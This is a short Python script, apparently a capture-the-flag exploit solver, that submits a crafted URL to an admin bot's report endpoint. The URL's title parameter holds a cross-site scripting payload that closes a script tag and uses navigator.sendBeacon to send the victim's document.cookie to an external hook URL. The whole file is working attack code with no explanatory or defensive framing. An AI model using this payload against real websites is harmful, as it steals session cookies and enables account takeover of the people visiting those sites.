import os
import httpx
import urllib.parse

HOST = os.getenv("HOST", "localhost")
BOT_PORT = int(os.getenv("BOT_PORT", 1337))
WEB_PORT = int(os.getenv("WEB_PORT", 3000))

HOOK_URL = os.environ["HOOK_URL"]

client = httpx.Client(base_url=f"http://{HOST}:{BOT_PORT}")

res = client.post(
    "/api/report",
    json={
        "url": f"http://web:3000/note?title={urllib.parse.quote(f"</script>$`navigator.sendBeacon('{HOOK_URL}?' + document.cookie);</script>")}",
    },
    timeout=10,
)
print(res.text)
